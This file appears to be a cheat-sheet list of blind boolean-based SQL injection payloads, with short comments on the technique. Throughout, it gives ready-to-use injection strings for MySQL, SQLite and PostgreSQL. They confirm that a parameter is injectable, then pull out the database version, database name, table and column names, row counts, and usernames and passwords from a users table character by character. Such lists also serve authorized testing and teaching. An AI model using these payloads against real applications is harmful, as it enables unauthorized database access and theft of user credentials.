# ============================================================
# SQL Injection Payloads - Blind Boolean-Based
# ============================================================
# Target: Pages that behave differently for true vs false conditions
#   but don't display query results directly.
#
# Technique: Inject conditions and observe response differences
#   (page content, HTTP status, response size).
# ============================================================

# --- Confirm injectable ---
# If both return different results, the parameter is injectable
' AND 1=1 --
' AND 1=2 --

# --- Database version extraction (char by char) ---
# MySQL: extract first character of version string
' AND SUBSTRING(@@version,1,1)='5' --
' AND SUBSTRING(@@version,1,1)='8' --

# SQLite
' AND SUBSTR((SELECT sqlite_version()),1,1)='3' --

# PostgreSQL
' AND SUBSTRING(version(),1,1)='P' --

# --- Extract database name (MySQL) ---
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
' AND SUBSTRING(database(),2,1)='a' --
# ASCII approach (more automatable)
' AND ASCII(SUBSTRING(database(),1,1))>96 --
' AND ASCII(SUBSTRING(database(),1,1))>109 --
' AND ASCII(SUBSTRING(database(),1,1))=116 --

# --- Extract table names ---
# MySQL
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u' --
# SQLite
' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u' --

# --- Extract column names ---
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)='i' --

# --- Extract data ---
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a' --
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='p' --

# --- Row count ---
' AND (SELECT COUNT(*) FROM users)>0 --
' AND (SELECT COUNT(*) FROM users)>5 --
' AND (SELECT COUNT(*) FROM users)=3 --

# --- Length detection ---
' AND LENGTH((SELECT database()))>5 --
' AND LENGTH((SELECT database()))=8 --
' AND LENGTH((SELECT username FROM users LIMIT 0,1))>4 --

# --- Numeric context ---
1 AND 1=1
1 AND 1=2
1 AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a'
